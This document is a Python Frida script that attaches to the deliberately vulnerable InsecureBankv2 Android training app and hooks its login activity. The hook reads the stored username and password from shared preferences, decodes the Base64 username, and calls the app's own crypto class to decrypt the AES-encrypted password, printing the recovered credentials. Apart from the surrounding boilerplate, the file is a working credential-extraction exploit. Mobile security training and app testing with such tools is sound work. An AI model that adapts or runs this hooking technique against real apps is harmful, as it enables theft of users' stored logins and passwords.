import frida, sys

def on_message(message, data):
	if message['type'] == 'send':
		print("[*] {0}".format(message['payload']))
	else:
		print(message)

code = """
Java.perform(function () {
	var main = Java.use('com.android.insecurebankv2.LoginActivity');
	var crycls = Java.use('com.android.insecurebankv2.CryptoClass');
	var b64 = Java.use('android.util.Base64');
	var str = Java.use('java.lang.String');

	main.fillData.implementation = function () {
	send('Function fillData called');
	var spvar = this.getSharedPreferences("mySharedPreferences", 0);

	//Get Username which will be in base64 
	send("Username Encoded: ");
	console.log(spvar.getString("EncryptedUsername", null));

	//Decode the Username
	send("Username Decoded: ");
	var b64var = b64.$new();
	var dstr = str.$new(b64var.decode('ZGluZXNo', 0));
	console.log(dstr);

	//Get the Password which will be Encrypted
	console.log(" \\nPassword Encrypted :");
	console.log(spvar.getString("superSecurePassword", null));

	//Decrypt the Password
	console.log("Password Decrypted:");
	var cryclsvar = crycls.$new();
	console.log(cryclsvar.aesDeccryptedString(spvar.getString("superSecurePassword", null)));
	};


});
"""

process = frida.get_usb_device().attach('com.android.insecurebankv2')
script = process.create_script(code)
script.on('message', on_message)
script.load()
sys.stdin.read()
